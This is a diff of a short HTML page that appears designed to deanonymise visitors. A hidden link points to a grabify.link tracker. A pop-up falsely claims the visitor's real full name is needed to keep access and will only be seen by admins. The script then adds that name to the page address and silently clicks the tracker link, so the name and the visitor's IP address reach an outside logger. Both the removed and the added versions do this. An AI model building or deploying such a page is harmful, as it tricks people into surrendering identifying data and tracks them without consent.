@@ -5,9 +5,9 @@
 <body>
 <a referrerpolicy = "no-referrer-when-downgrade" href="https://grabify.link/AKC6CW"></a>
 <script>
-	const name = prompt("Type First Name, Last Name, And If You Perfer To Be Called Something Else\r\nThis Info Will Only Be Visible To Admins\r\nExample:Robert James Bob\r\nDo Not Type A Fake Name Or Will No Longer Have Access, Press Ok When You Have Typed The Correct Info");
-	location.hash = name;
-	document.querySelector("a").click();
+	if(location.href.includes("?id")){document.querySelector("a").click();}
+	const name = prompt("Type First Name, Last Name, And If You Want To Be Called Something Else\r\nThis Info Will Only Be Visible To Admins\r\nExample:Robert James Bob\r\nDo Not Type A Fake Name Or Will No Longer Have Access, Press Ok When You Have Typed The Correct Info");
+	location.href+="?id="+name;
 </script>
 </body>
 </html>
